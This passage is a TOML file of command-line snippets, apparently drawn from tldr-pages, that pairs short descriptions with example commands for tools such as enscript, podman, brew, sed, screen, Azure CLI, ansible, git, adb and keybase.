  description = "Run a probe against a URL [s]aving [s]creenshots of certain paths, with [s]creenshot [t]imeouts (assets are saved in `./output`)"
  command = "httpx -u <https://www.github.com> -path </tldr-pages/tldr,/projectdiscovery/httpx> -ss -st <10>"
  output = ""

[[snippets]]
  description = "Generate a PostScript file from a text file"
  command = "enscript <path/to/input_file> --output=<path/to/output_file>"
  output = ""

[[snippets]]
  description = "Generate a file in a different language than PostScript"
  command = "enscript <path/to/input_file> --language=<html|rtf|...> --output=<path/to/output_file>"
  output = ""

[[snippets]]
  description = "Generate a PostScript file with a landscape layout, splitting the page into columns (maximum 9)"
  command = "enscript <path/to/input_file> --columns=<num> --landscape --output=<path/to/output_file>"
  output = ""

[[snippets]]
  description = "Display available syntax highlighting languages and file formats"
  command = "enscript --help-highlight"
  output = ""

[[snippets]]
  description = "Generate a PostScript file with syntax highlighting and color for a specified language"
  command = "enscript <path/to/input_file> --color=1 --highlight=<language> --output=<path/to/output_file>"
  output = ""

[[snippets]]
  description = "Shutdown the daemon without a service manager"
  command = "pueue shutdown"
  output = ""

[[snippets]]
  description = "Remove one or more images given their names"
  command = "podman rmi <image:tag> <image2:tag> <...>"
  output = ""

[[snippets]]
  description = "Force remove an image"
  command = "podman rmi --force <image>"
  output = ""

[[snippets]]
  description = "Remove an image without deleting untagged parents"
  command = "podman rmi --no-prune <image>"
  output = ""

[[snippets]]
  description = "Display help"
  command = "podman rmi"
  output = ""

[[snippets]]
  description = "Lint files in the "src" directory"
  command = "xo"
  output = ""

[[snippets]]
  description = "Lint a given set of files"
  command = "xo <path/to/file1.js path/to/file2.js ...>"
  output = ""

[[snippets]]
  description = "Automatically fix any lint issues found"
  command = "xo --fix"
  output = ""

[[snippets]]
  description = "Lint using spaces as indentation instead of tabs"
  command = "xo --space"
  output = ""

[[snippets]]
  description = "Lint using the "prettier" code style"
  command = "xo --prettier"
  output = ""

[[snippets]]
  description = "Switch the default Rust toolchain (see `rustup help toolchain` for more information)"
  command = "rustup default <toolchain>"
  output = ""

[[snippets]]
  description = "View documentation for the original command"
  command = "tldr docker rm"
  output = ""

[[snippets]]
  description = "Replace all `apple` (basic regex) occurrences with `mango` (basic regex) in all input lines and print the result to `stdout`"
  command = "<command> | sed 's/apple/mango/g'"
  output = ""

[[snippets]]
  description = "Execute a specific script [f]ile and print the result to `stdout`"
  command = "<command> | sed -f <path/to/script.sed>"
  output = ""

[[snippets]]
  description = "Print just a first line to `stdout`"
  command = "<command> | sed -n '1p'"
  output = ""

[[snippets]]
  description = "Convert a QRT file to a PPM image"
  command = "qrttoppm <path/to/file.qrt> > <path/to/image.ppm>"
  output = ""

[[snippets]]
  description = "Install the latest stable version of a formula or cask (use `--devel` for development versions)"
  command = "brew install <formula>"
  output = ""

[[snippets]]
  description = "List all installed formulae and casks"
  command = "brew list"
  output = ""

[[snippets]]
  description = "Upgrade an installed formula or cask (if none is given, all installed formulae/casks are upgraded)"
  command = "brew upgrade <formula>"
  output = ""

[[snippets]]
  description = "Fetch the newest version of Homebrew and of all formulae and casks from the Homebrew source repository"
  command = "brew update"
  output = ""

[[snippets]]
  description = "Show formulae and casks that have a more recent version available"
  command = "brew outdated"
  output = ""

[[snippets]]
  description = "Search for available formulae (i.e. packages) and casks (i.e. native macOS `.app` packages)"
  command = "brew search <text>"
  output = ""

[[snippets]]
  description = "Display information about a formula or a cask (version, installation path, dependencies, etc.)"
  command = "brew info <formula>"
  output = ""

[[snippets]]
  description = "Check the local Homebrew installation for potential problems"
  command = "brew doctor"
  output = ""

[[snippets]]
  description = "Extract elements from an XML document (producing XPATH expressions)"
  command = "xml elements <path/to/input.xml|URI> > <path/to/elements.xpath>"
  output = ""

[[snippets]]
  description = "Extract elements and their attributes from an XML document"
  command = "xml elements -a <path/to/input.xml|URI> > <path/to/elements.xpath>"
  output = ""

[[snippets]]
  description = "Extract elements and their attributes and values from an XML document"
  command = "xml elements -v <path/to/input.xml|URI> > <path/to/elements.xpath>"
  output = ""

[[snippets]]
  description = "Print sorted unique elements from an XML document to see its structure"
  command = "xml elements -u <path/to/input.xml|URI>"
  output = ""

[[snippets]]
  description = "Print sorted unique elements from an XML document up to a depth of 3"
  command = "xml elements -d<3> <path/to/input.xml|URI>"
  output = ""

[[snippets]]
  description = "Display help"
  command = "xml elements --help"
  output = ""

[[snippets]]
  description = "Start a server on the default port (12865) and fork to background"
  command = "netserver"
  output = ""

[[snippets]]
  description = "Start server in foreground and do not fork"
  command = "netserver -D"
  output = ""

[[snippets]]
  description = "Specify [p]ort"
  command = "netserver -p <port>"
  output = ""

[[snippets]]
  description = "Force IPv[4] or IPv[6]"
  command = "netserver -<4|6>"
  output = ""

[[snippets]]
  description = "Check if a version string respects the semantic versioning format (prints an empty string if it does not match)"
  command = "semver <1.2>"
  output = ""

[[snippets]]
  description = "Convert a version string to the semantic versioning format"
  command = "semver --coerce <1.2>"
  output = ""

[[snippets]]
  description = "Test if `1.2.3` matches the `^1.0` range (prints an empty string if it does not match)"
  command = "semver <1.2.3> --range ""<^1.0>"""
  output = ""

[[snippets]]
  description = "Test with multiple ranges"
  command = "semver <1.2.3> --range <"">=1.0""> <""<2.0"">"
  output = ""

[[snippets]]
  description = "Test multiple version strings and return only the ones that match"
  command = "semver <1.2.3> <2.0.0> --range ""<^1.0>"""
  output = ""

[[snippets]]
  description = "View documentation for scanning files using the `clamd` daemon"
  command = "tldr clamdscan"
  output = ""

[[snippets]]
  description = "View documentation for scanning files without the `clamd` daemon running"
  command = "tldr clamscan"
  output = ""

[[snippets]]
  description = "View documentation for updating the virus definitions"
  command = "tldr freshclam"
  output = ""

[[snippets]]
  description = "Start a new screen session"
  command = "screen"
  output = ""

[[snippets]]
  description = "Start a new named screen session"
  command = "screen -S <session_name>"
  output = ""

[[snippets]]
  description = "Start a new daemon and log the output to `screenlog.x`"
  command = "screen -dmLS <session_name> <command>"
  output = ""

[[snippets]]
  description = "Show open screen sessions"
  command = "screen -ls"
  output = ""

[[snippets]]
  description = "Reattach to an open screen"
  command = "screen -r <session_name>"
  output = ""

[[snippets]]
  description = "Detach from inside a screen"
  command = "<Ctrl> + A, D"
  output = ""

[[snippets]]
  description = "Kill the current screen session"
  command = "<Ctrl> + A, K"
  output = ""

[[snippets]]
  description = "Kill a detached screen"
  command = "screen -X -S <session_name> quit"
  output = ""

[[snippets]]
  description = "Print the text message as a large banner (quotes are optional)"
  command = "banner ""<Hello World>"""
  output = ""

[[snippets]]
  description = "Use a banner [w]idth of 50 characters"
  command = "banner -w 50 ""<Hello World>"""
  output = ""

[[snippets]]
  description = "Read text from `stdin`"
  command = "banner"
  output = ""

[[snippets]]
  description = "List details of available Virtual Machines"
  command = "az vm list"
  output = ""

[[snippets]]
  description = "Create a virtual machine using the default Ubuntu image and generate ssh keys"
  command = "az vm create --resource-group <rg> --name <vm_name> --image <UbuntuLTS> --admin-user <azureuser> --generate-ssh-keys"
  output = ""

[[snippets]]
  description = "Stop a Virtual Machine"
  command = "az vm stop --resource-group <rg> --name <vm_name>"
  output = ""

[[snippets]]
  description = "Deallocate a Virtual Machine"
  command = "az vm deallocate --resource-group <rg> --name <vm_name>"
  output = ""

[[snippets]]
  description = "Start a Virtual Machine"
  command = "az vm start --resource-group <rg> --name <vm_name>"
  output = ""

[[snippets]]
  description = "Restart a Virtual Machine"
  command = "az vm restart --resource-group <rg> --name <vm_name>"
  output = ""

[[snippets]]
  description = "List VM images available in the Azure Marketplace"
  command = "az vm image list"
  output = ""

[[snippets]]
  description = "Enable telemetry uploading"
  command = "gotelemetry on"
  output = ""

[[snippets]]
  description = "Disable telemetry uploading"
  command = "gotelemetry off"
  output = ""

[[snippets]]
  description = "Run a Web Viewer for local telemetry data"
  command = "gotelemetry view"
  output = ""

[[snippets]]
  description = "Print the current telemetry environment"
  command = "gotelemetry env"
  output = ""

[[snippets]]
  description = "Display help for a specific subcommand"
  command = "gotelemetry help <subcommand>"
  output = ""

[[snippets]]
  description = "Intersect file [a] and file(s) [b] regarding the sequences' [s]trand and save the result to a specific file"
  command = "bedtools intersect -a <path/to/file_A> -b <path/to/file_B1 path/to/file_B2 ...> -s > <path/to/output_file>"
  output = ""

[[snippets]]
  description = "Intersect two files with a [l]eft [o]uter [j]oin, i.e. report each feature from `file1` and NULL if no overlap with `file2`"
  command = "bedtools intersect -a <path/to/file1> -b <path/to/file2> -loj > <path/to/output_file>"
  output = ""

[[snippets]]
  description = "Using more efficient algorithm to intersect two pre-sorted files"
  command = "bedtools intersect -a <path/to/file1> -b <path/to/file2> -sorted > <path/to/output_file>"
  output = ""

[[snippets]]
  description = "[g]roup a file based on the first three and the fifth [c]olumn and apply the sum [o]peration on the sixth column"
  command = "bedtools groupby -i <path/to/file> -c 1-3,5 -g 6 -o sum"
  output = ""

[[snippets]]
  description = "Convert bam-formatted [i]nput file to a bed-formatted one"
  command = "bedtools bamtobed -i <path/to/file.bam> > <path/to/file.bed>"
  output = ""

[[snippets]]
  description = "Find for all features in `file1.bed` the closest one in `file2.bed` and write their [d]istance in an extra column (input files must be sorted)"
  command = "bedtools closest -a <path/to/file1.bed> -b <path/to/file2.bed> -d"
  output = ""

[[snippets]]
  description = "Generate tags for a single file, and output them to a file named "tags" in the current directory, overwriting the file if it exists"
  command = "ctags <path/to/file>"
  output = ""

[[snippets]]
  description = "Generate tags for all files in the current directory, and output them to a specific file, overwriting the file if it exists"
  command = "ctags -f <path/to/file> *"
  output = ""

[[snippets]]
  description = "Generate tags for all files in the current directory and all subdirectories"
  command = "ctags --recurse"
  output = ""

[[snippets]]
  description = "Generate tags for a single file, and output them with start line number and end line number in JSON format"
  command = "ctags --fields=+ne --output-format=json <path/to/file>"
  output = ""

[[snippets]]
  description = "Translate a word (language is detected automatically)"
  command = "trans ""<word_or_sentence_to_translate>"""
  output = ""

[[snippets]]
  description = "Get a brief translation"
  command = "trans --brief ""<word_or_sentence_to_translate>"""
  output = ""

[[snippets]]
  description = "Translate a word into french"
  command = "trans :<fr> <word>"
  output = ""

[[snippets]]
  description = "Translate a word from German to English"
  command = "trans <de>:<en> <Schmetterling>"
  output = ""

[[snippets]]
  description = "Behave like a dictionary to get the meaning of a word"
  command = "trans -d <word>"
  output = ""

[[snippets]]
  description = "Apply a manifest"
  command = "puppet apply <path/to/manifest>"
  output = ""

[[snippets]]
  description = "Execute puppet code"
  command = "puppet apply --execute <code>"
  output = ""

[[snippets]]
  description = "Use a specific module and hiera configuration file"
  command = "puppet apply --modulepath <path/to/directory> --hiera_config <path/to/file> <path/to/manifest>"
  output = ""

[[snippets]]
  description = "Search and list packages from Hackage"
  command = "cabal list <search_string>"
  output = ""

[[snippets]]
  description = "Show information about a package"
  command = "cabal info <package>"
  output = ""

[[snippets]]
  description = "Download and install a package"
  command = "cabal install <package>"
  output = ""

[[snippets]]
  description = "Create a new Haskell project in the current directory"
  command = "cabal init"
  output = ""

[[snippets]]
  description = "Build the project in the current directory"
  command = "cabal build"
  output = ""

[[snippets]]
  description = "Run tests of the project in the current directory"
  command = "cabal test"
  output = ""

[[snippets]]
  description = "Transpile a specified input file and output to `stdout`"
  command = "swc <path/to/file>"
  output = ""

[[snippets]]
  description = "Transpile the input file every time it is changed"
  command = "swc <path/to/file> --watch"
  output = ""

[[snippets]]
  description = "Transpile a specified input file and output to a specific file"
  command = "swc <path/to/input_file> --out-file <path/to/output_file>"
  output = ""

[[snippets]]
  description = "Transpile a specified input directory and output to a specific directory"
  command = "swc <path/to/input_directory> --out-dir <path/to/output_directory>"
  output = ""

[[snippets]]
  description = "Transpile a specified input directory using a specific configuration file"
  command = "swc <path/to/input_directory> --config-file <path/to/.swcrc>"
  output = ""

[[snippets]]
  description = "Ignore files in a directory specified using glob path"
  command = "swc <path/to/input_directory> --ignore <path/to/ignored_file1 path/to/ignored_file2 ...>"
  output = ""

[[snippets]]
  description = "Assemble an IR file"
  command = "llvm-as -o <path/to/out.bc> <path/to/source.ll>"
  output = ""

[[snippets]]
  description = "Assemble an IR file and include a module hash in the produced Bitcode file"
  command = "llvm-as --module-hash -o <path/to/out.bc> <path/to/source.ll>"
  output = ""

[[snippets]]
  description = "Read an IR file from `stdin` and assemble it"
  command = "cat <path/to/source.ll> | llvm-as -o <path/to/out.bc>"
  output = ""

[[snippets]]
  description = "Convert to HTML"
  command = "gladtex <path/to/input.htex>"
  output = ""

[[snippets]]
  description = "Save the converted file to a specific location"
  command = "gladtex <path/to/input.htex> -o <path/to/output.html>"
  output = ""

[[snippets]]
  description = "Save the generated images to a specific [d]irectory"
  command = "gladtex <path/to/input.htex> -d <path/to/image_output_directory>"
  output = ""

[[snippets]]
  description = "Set image [r]esolution (in dpi, default is 100)"
  command = "gladtex <path/to/input.htex> -r <resolution>"
  output = ""

[[snippets]]
  description = "[k]eep LaTeX files after conversion"
  command = "gladtex <path/to/input.htex> -k"
  output = ""

[[snippets]]
  description = "Set [b]ackground and [f]oreground color of the images"
  command = "gladtex <path/to/input.htex> -b <background_color> -f <foreground_color>"
  output = ""

[[snippets]]
  description = "Convert Markdown to HTML using `pandoc` and `gladtex`"
  command = "pandoc -s -t html --gladtex <path/to/input.md> | gladtex -o <path/to/output.html>"
  output = ""

[[snippets]]
  description = "List hosts belonging to a group"
  command = "ansible <group> --list-hosts"
  output = ""

[[snippets]]
  description = "Ping a group of hosts by invoking the ping [m]odule"
  command = "ansible <group> -m ping"
  output = ""

[[snippets]]
  description = "Display facts about a group of hosts by invoking the setup [m]odule"
  command = "ansible <group> -m setup"
  output = ""

[[snippets]]
  description = "Execute a command on a group of hosts by invoking command module with arguments"
  command = "ansible <group> -m command -a '<my_command>'"
  output = ""

[[snippets]]
  description = "Execute a command with administrative privileges"
  command = "ansible <group> --become --ask-become-pass -m command -a '<my_command>'"
  output = ""

[[snippets]]
  description = "Execute a command using a custom inventory file"
  command = "ansible <group> -i <inventory_file> -m command -a '<my_command>'"
  output = ""

[[snippets]]
  description = "List the groups in an inventory"
  command = "ansible localhost -m debug -a '<var=groups.keys()>'"
  output = ""

[[snippets]]
  description = "Initialize a project with a skeleton configuration"
  command = "wrangler init <project_name>"
  output = ""

[[snippets]]
  description = "Authenticate with Cloudflare"
  command = "wrangler login"
  output = ""

[[snippets]]
  description = "Start a local development server"
  command = "wrangler dev --host <hostname>"
  output = ""

[[snippets]]
  description = "Publish the worker script"
  command = "wrangler publish"
  output = ""

[[snippets]]
  description = "Aggregate logs from the production worker"
  command = "wrangler tail"
  output = ""

[[snippets]]
  description = "Convert a HTML document into PDF"
  command = "wkhtmltopdf <input.html> <output.pdf>"
  output = ""

[[snippets]]
  description = "Specify the PDF page size (please see `PaperSize` of `QPrinter` for supported sizes)"
  command = "wkhtmltopdf --page-size <A4> <input.html> <output.pdf>"
  output = ""

[[snippets]]
  description = "Set the PDF page margins"
  command = "wkhtmltopdf --margin-<top|bottom|left|right> <10mm> <input.html> <output.pdf>"
  output = ""

[[snippets]]
  description = "Set the PDF page orientation"
  command = "wkhtmltopdf --orientation <Landscape|Portrait> <input.html> <output.pdf>"
  output = ""

[[snippets]]
  description = "Generate a greyscale version of the PDF document"
  command = "wkhtmltopdf --grayscale <input.html> <output.pdf>"
  output = ""

[[snippets]]
  description = "Install extension packs to VirtualBox (Note: you need to remove the existing version of the extension pack before installing a new version.)"
  command = "VBoxManage extpack install <path/to/file.vbox-extpack>"
  output = ""

[[snippets]]
  description = "Remove the existing version of the VirtualBox extension pack"
  command = "VBoxManage extpack install --replace"
  output = ""

[[snippets]]
  description = "Uninstall extension packs from VirtualBox"
  command = "VBoxManage extpack uninstall <extension_pack_name>"
  output = ""

[[snippets]]
  description = "Uninstall extension packs and skip most uninstallation refusals"
  command = "VBoxManage extpack uninstall --force <extension_pack_name>"
  output = ""

[[snippets]]
  description = "Clean up temporary files and directories left by extension packs"
  command = "VBoxManage extpack cleanup"
  output = ""

[[snippets]]
  description = "Show changed files which are not yet added for commit"
  command = "git status"
  output = ""

[[snippets]]
  description = "Give output in [s]hort format"
  command = "git status --short"
  output = ""

[[snippets]]
  description = "Show the [b]ranch and tracking info"
  command = "git status --branch"
  output = ""

[[snippets]]
  description = "Show output in [s]hort format along with [b]ranch info"
  command = "git status --short --branch"
  output = ""

[[snippets]]
  description = "Show the number of entries currently stashed away"
  command = "git status --show-stash"
  output = ""

[[snippets]]
  description = "Don't show untracked files in the output"
  command = "git status --untracked-files=no"
  output = ""

[[snippets]]
  description = "Use UNIX (or DOS) pipes to pipe `stdout` of any command through gnomon"
  command = "<npm test> | gnomon"
  output = ""

[[snippets]]
  description = "Show number of seconds since the start of the process"
  command = "<npm test> | gnomon --type=elapsed-total"
  output = ""

[[snippets]]
  description = "Show an absolute timestamp in UTC"
  command = "<npm test> | gnomon --type=absolute"
  output = ""

[[snippets]]
  description = "Use a high threshold of 0.5 seconds, exceeding which the timestamp will be colored bright red"
  command = "<npm test> | gnomon --high 0.5"
  output = ""

[[snippets]]
  description = "Use a medium threshold of 0.2 seconds, exceeding which the timestamp will be colored bright yellow"
  command = "<npm test> | gnomon --medium <0.2>"
  output = ""

[[snippets]]
  description = "Connect to a local database on port 3306, using the current user's username"
  command = "mycli <database_name>"
  output = ""

[[snippets]]
  description = "Connect to a database (user will be prompted for a password)"
  command = "mycli -u <username> <database_name>"
  output = ""

[[snippets]]
  description = "Connect to a database on another host"
  command = "mycli -h <database_host> -P <port> -u <username> <database_name>"
  output = ""

[[snippets]]
  description = "Perform checks and create a `.crate` file (equivalent of `cargo publish --dry-run`)"
  command = "cargo package"
  output = ""

[[snippets]]
  description = "Display what files would be included in the tarball without actually creating it"
  command = "cargo package --list"
  output = ""

[[snippets]]
  description = "Convert a Palm bitmap to a PNM image"
  command = "palmtopnm <path/to/file.palm> > <path/to/file.pnm>"
  output = ""

[[snippets]]
  description = "Display information about the input file"
  command = "palmtopnm -verbose <path/to/file.palm> > <path/to/file.pnm>"
  output = ""

[[snippets]]
  description = "Convert the n'th rendition of the image contained in the input file"
  command = "palmtopnm -rendition <n> <path/to/file.palm> > <path/to/file.pnm>"
  output = ""

[[snippets]]
  description = "Write a histogram of the colors in the input file to `stdout`"
  command = "palmtopnm -showhist <path/to/file.palm> > <path/to/file.pnm>"
  output = ""

[[snippets]]
  description = "Output the transparent color of the input image if set"
  command = "palmtopnm -transparent <path/to/file.palm>"
  output = ""

[[snippets]]
  description = "Start a service"
  command = "sudo sv up <path/to/service>"
  output = ""

[[snippets]]
  description = "Stop a service"
  command = "sudo sv down <path/to/service>"
  output = ""

[[snippets]]
  description = "Get service status"
  command = "sudo sv status <path/to/service>"
  output = ""

[[snippets]]
  description = "Reload a service"
  command = "sudo sv reload <path/to/service>"
  output = ""

[[snippets]]
  description = "Start a service, but only if it's not running and don't restart it if it stops"
  command = "sudo sv once <path/to/service>"
  output = ""

[[snippets]]
  description = "Convert a PAM image to an equivalent PNM image, i.e. a PBM, PGM or PPM image"
  command = "pamtopnm <path/to/image.pam> > <path/to/output.pbm|pgm|ppm>"
  output = ""

[[snippets]]
  description = "Display version"
  command = "pamtopnm -version"
  output = ""

[[snippets]]
  description = "Create a new repository (if the repository name is not set, the default name will be the name of the current directory)"
  command = "gh repo create <name>"
  output = ""

[[snippets]]
  description = "Clone a repository"
  command = "gh repo clone <owner>/<repository>"
  output = ""

[[snippets]]
  description = "Fork and clone a repository"
  command = "gh repo fork <owner>/<repository> --clone"
  output = ""

[[snippets]]
  description = "View a repository in the default web browser"
  command = "gh repo view <repository> --web"
  output = ""

[[snippets]]
  description = "List repositories owned by a specific user or organization (if the owner is not set, the default owner will be the currently logged in user)"
  command = "gh repo list <owner>"
  output = ""

[[snippets]]
  description = "List only non-forks repositories and limit the number of repositories to list (default: 30)"
  command = "gh repo list <owner> --source -L <limit>"
  output = ""

[[snippets]]
  description = "List repositories with a specific primary coding language"
  command = "gh repo list <owner> --language <language_name>"
  output = ""

[[snippets]]
  description = "Start PHP's built-in web server for the current Laravel application"
  command = "php artisan serve"
  output = ""

[[snippets]]
  description = "Start an interactive PHP command-line interface"
  command = "php artisan tinker"
  output = ""

[[snippets]]
  description = "Generate a new Eloquent model class with a migration, factory and resource controller"
  command = "php artisan make:model <ModelName> --all"
  output = ""

[[snippets]]
  description = "Display a list of all available commands"
  command = "php artisan help"
  output = ""

[[snippets]]
  description = "Display help"
  command = "consul --help"
  output = ""

[[snippets]]
  description = "Display help for a subcommand"
  command = "consul <subcommand> --help"
  output = ""

[[snippets]]
  description = "Display version"
  command = "consul --version"
  output = ""

[[snippets]]
  description = "Compile a specific contract to hex"
  command = "solcjs --bin <path/to/file.sol>"
  output = ""

[[snippets]]
  description = "Compile the ABI of a specific contract"
  command = "solcjs --abi <path/to/file.sol>"
  output = ""

[[snippets]]
  description = "Specify a base path to resolve imports from"
  command = "solcjs --bin --base-path <path/to/directory> <path/to/file.sol>"
  output = ""

[[snippets]]
  description = "Specify one or more paths to include containing external code"
  command = "solcjs --bin --include-path <path/to/directory> <path/to/file.sol>"
  output = ""

[[snippets]]
  description = "Optimise the generated bytecode"
  command = "solcjs --bin --optimize <path/to/file.sol>"
  output = ""

[[snippets]]
  description = "Use current directory as the repository, initialize a SFTP storage and encrypt the storage with a password"
  command = "duplicacy init -e <snapshot_id> <sftp://user@192.168.2.100/path/to/storage/>"
  output = ""

[[snippets]]
  description = "Save a snapshot of the repository to the default storage"
  command = "duplicacy backup"
  output = ""

[[snippets]]
  description = "List snapshots of current repository"
  command = "duplicacy list"
  output = ""

[[snippets]]
  description = "Restore the repository to a previously saved snapshot"
  command = "duplicacy restore -r <revision>"
  output = ""

[[snippets]]
  description = "Check the integrity of snapshots"
  command = "duplicacy check"
  output = ""

[[snippets]]
  description = "Add another storage to be used for the existing repository"
  command = "duplicacy add <storage_name> <snapshot_id> <storage_url>"
  output = ""

[[snippets]]
  description = "Prune a specific revision of snapshot"
  command = "duplicacy prune -r <revision>"
  output = ""

[[snippets]]
  description = "Prune revisions, keeping one revision every `n` days for all revisions older than `m` days"
  command = "duplicacy prune -keep <n:m>"
  output = ""

[[snippets]]
  description = "Render a single line of text as a PBM image"
  command = "pbmtextps ""<Hello World!>"" > <path/to/output.pbm>"
  output = ""

[[snippets]]
  description = "Specify the font and font size"
  command = "pbmtextps -font <Times-Roman> -fontsize <30>  ""<Hello World!>"" > <path/to/output.pbm>"
  output = ""

[[snippets]]
  description = "Specify the desired left and top margins"
  command = "pbmtextps -leftmargin <70> -topmargin <162>  ""<Hello World!>"" > <path/to/output.pbm>"
  output = ""

[[snippets]]
  description = "Do not output the rendered text as a PBM image, but a PostScript program that would create this image"
  command = "pbmtextps -dump-ps ""<Hello World!>"" > <path/to/output.ps>"
  output = ""

[[snippets]]
  description = "Use it as a search engine, asking for the mass of the sun"
  command = "sgpt ""<mass of the sun>"""
  output = ""

[[snippets]]
  description = "Execute Shell commands, and apply `chmod 444` to all files in the current directory"
  command = "sgpt --shell ""<make all files in current directory read only>"""
  output = ""

[[snippets]]
  description = "Generate code, solving classic fizz buzz problem"
  command = "sgpt --code ""<solve fizz buzz problem using Python>"""
  output = ""

[[snippets]]
  description = "Start a chat session with a unique session name"
  command = "sgpt --chat <session_name> ""<please remember my favorite number: 4>"""
  output = ""

[[snippets]]
  description = "Start a `REPL` (Read–eval–print loop) session"
  command = "sgpt --repl <command>"
  output = ""

[[snippets]]
  description = "Display help"
  command = "sgpt --help"
  output = ""

[[snippets]]
  description = "Print file with author name and commit hash on each line"
  command = "git blame <path/to/file>"
  output = ""

[[snippets]]
  description = "Print file with author email and commit hash on each line"
  command = "git blame -e <path/to/file>"
  output = ""

[[snippets]]
  description = "Print file with author name and commit hash on each line at a specific commit"
  command = "git blame <commit> <path/to/file>"
  output = ""

[[snippets]]
  description = "Print file with author name and commit hash on each line before a specific commit"
  command = "git blame <commit>~ <path/to/file>"
  output = ""

[[snippets]]
  description = "Push an Android application to an emulator/device"
  command = "adb install <path/to/file.apk>"
  output = ""

[[snippets]]
  description = "Push an Android application to a specific emulator/device (overrides `$ANDROID_SERIAL`)"
  command = "adb -s <serial_number> install <path/to/file.apk>"
  output = ""

[[snippets]]
  description = "[r]einstall an existing app, keeping its data"
  command = "adb install -r <path/to/file.apk>"
  output = ""

[[snippets]]
  description = "Push an Android application allowing version code [d]owngrade (debuggable packages only)"
  command = "adb install -d <path/to/file.apk>"
  output = ""

[[snippets]]
  description = "[g]rant all permissions listed in the app manifest"
  command = "adb install -g <path/to/file.apk>"
  output = ""

[[snippets]]
  description = "Quickly update an installed package by only updating the parts of the APK that changed"
  command = "adb install --fastdeploy <path/to/file.apk>"
  output = ""

[[snippets]]
  description = "List all installed tools"
  command = "volta list"
  output = ""

[[snippets]]
  description = "Install the latest version of a tool"
  command = "volta install <node|npm|yarn|package_name>"
  output = ""

[[snippets]]
  description = "Install a specific version of a tool"
  command = "volta install <node|npm|yarn>@version"
  output = ""

[[snippets]]
  description = "Choose a tool version for a project (will store it in `package.json`)"
  command = "volta pin <node|npm|yarn>@version"
  output = ""

[[snippets]]
  description = "Display help"
  command = "volta help"
  output = ""

[[snippets]]
  description = "Display help for a subcommand"
  command = "volta help <fetch|install|uninstall|pin|list|completions|which|setup|run|help>"
  output = ""

[[snippets]]
  description = "Install a module"
  command = "drupal module:install <module_name>"
  output = ""

[[snippets]]
  description = "Uninstall a module"
  command = "drupal module:uninstall <module_name>"
  output = ""

[[snippets]]
  description = "Clear all caches"
  command = "drupal cache:rebuild"
  output = ""

[[snippets]]
  description = "View current Drupal installation status"
  command = "drupal site:status"
  output = ""

[[snippets]]
  description = "Fetch the F-Droid index"
  command = "fdroidcl update"
  output = ""

[[snippets]]
  description = "Display info about an app"
  command = "fdroidcl show <app_id>"
  output = ""

[[snippets]]
  description = "Download an APK file"
  command = "fdroidcl download <app_id>"
  output = ""

[[snippets]]
  description = "Search for an app in the index"
  command = "fdroidcl search <search_pattern>"
  output = ""

[[snippets]]
  description = "Install an app on a connected device"
  command = "fdroidcl install <app_id>"
  output = ""

[[snippets]]
  description = "Retrieve information about a backup"
  command = "gcloud sql backups describe <backup_id> --instance=<instance_id>"
  output = ""

[[snippets]]
  description = "Calculate the BLAKE2 checksum for one or more files"
  command = "b2sum <path/to/file1 path/to/file2 ...>"
  output = ""

[[snippets]]
  description = "Calculate and save the list of BLAKE2 checksums to a file"
  command = "b2sum <path/to/file1 path/to/file2 ...> > <path/to/file.b2>"
  output = ""

[[snippets]]
  description = "Calculate a BLAKE2 checksum from `stdin`"
  command = "<command> | b2sum"
  output = ""

[[snippets]]
  description = "Read a file of BLAKE2 sums and filenames and verify all files have matching checksums"
  command = "b2sum --check <path/to/file.b2>"
  output = ""

[[snippets]]
  description = "Only show a message for missing files or when verification fails"
  command = "b2sum --check --quiet <path/to/file.b2>"
  output = ""

[[snippets]]
  description = "Only show a message when verification fails, ignoring missing files"
  command = "b2sum --ignore-missing --check --quiet <path/to/file.b2>"
  output = ""

[[snippets]]
  description = "Follow another user"
  command = "keybase follow <username>"
  output = ""

[[snippets]]
  description = "Add a new proof"
  command = "keybase prove <service> <service_username>"
  output = ""

[[snippets]]
  description = "Sign a file"
  command = "keybase sign --infile <input_file> --outfile <output_file>"
  output = ""

[[snippets]]
  description = "Verify a signed file"
  command = "keybase verify --infile <input_file> --outfile <output_file>"
  output = ""

[[snippets]]
  description = "Encrypt a file"
  command = "keybase encrypt --infile <input_file> --outfile <output_file> <receiver>"
  output = ""

[[snippets]]
  description = "Decrypt a file"
  command = "keybase decrypt --infile <input_file> --outfile <output_file>"
  output = ""

[[snippets]]
  description = "Revoke current device, log out, and delete local data"
  command = "keybase deprovision"
  output = ""

[[snippets]]
  description = "Give a description of the type of the specified file. Works fine for files with no file extension"
  command = "file <path/to/file>"
  output = ""

[[snippets]]
  description = "Look inside a zipped file and determine the file type(s) inside"
  command = "file -z <foo.zip>"
  output = ""

[[snippets]]
  description = "Allow file to work with special or device files"
  command = "file -s <path/to/file>"
  output = ""

[[snippets]]
  description = "Don't stop at first file type match; keep going until the end of the file"
  command = "file -k <path/to/file>"
  output = ""

[[snippets]]
  description = "Determine the MIME encoding type of a file"
  command = "file -i <path/to/file>"
  output = ""

[[snippets]]
  description = "Create a new Laravel application"
  command = "lambo new <app_name>"
  output = ""

[[snippets]]
  description = "Install the application in a specific path"
  command = "lambo new --path=<path/to/directory> <app_name>"
  output = ""

[[snippets]]
  description = "Include authentication scaffolding"
  command = "lambo new --auth <app_name>"
  output = ""

[[snippets]]
  description = "Include a specific frontend"
  command = "lambo new --<vue|bootstrap|react> <app_name>"
  output = ""

[[snippets]]
  description = "Install npm dependencies after the project has been created"
  command = "lambo new --node <app_name>"
  output = ""

[[snippets]]
  description = "Create a Valet site after the project has been created"
  command = "lambo new --link <app_name>"
  output = ""

[[snippets]]
  description = "Create a new MySQL database with the same name as the project"
  command = "lambo new --create-db --dbuser=<user> --dbpassword=<password> <app_name>"
  output = ""

[[snippets]]
  description = "Open a specific editor after the project has been created"
  command = "lambo new --editor=""<editor>"" <app_name>"
  output = ""

[[snippets]]
  description = "Display what Git protocol is being used"
  command = "gh config get git_protocol"
  output = ""

[[snippets]]
  description = "Set protocol to SSH"
  command = "gh config set git_protocol <ssh>"
  output = ""

[[snippets]]
  description = "Use `delta` in side-by-side mode as the default pager for all `gh` commands"
  command = "gh config set pager '<delta --side-by-side>'"
  output = ""

[[snippets]]
  description = "Set text editor to Vim"
  command = "gh config set editor <vim>"
  output = ""

[[snippets]]
  description = "Reset to default text editor"
  command = "gh config set editor <"""">"
  output = ""

[[snippets]]
  description = "Disable interactive prompts"
  command = "gh config set prompt <disabled>"
  output = ""

[[snippets]]
  description = "Set a specific configuration value"
  command = "gh config set <key> <value>"
  output = ""

[[snippets]]
